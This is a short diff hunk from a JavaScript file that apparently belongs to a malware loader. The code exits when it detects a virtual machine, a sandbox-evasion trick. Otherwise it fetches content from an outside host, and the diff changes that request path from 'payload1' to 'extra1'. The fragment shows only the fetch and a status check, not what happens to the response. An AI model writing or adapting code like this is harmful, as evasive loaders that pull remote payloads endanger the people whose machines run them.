@@ -49,7 +49,7 @@ try{
                 console.log("Detected VM, altering behavior...");
                 process.exit(0);
             } else {
-                axios.get('https://tetrismic.vercel.app/payload1')
+                axios.get('https://tetrismic.vercel.app/extra1')
                     .then(response => {
                         if (response.status !== 200) {
                             throw new Error(`Bad status: ${response.status}`);
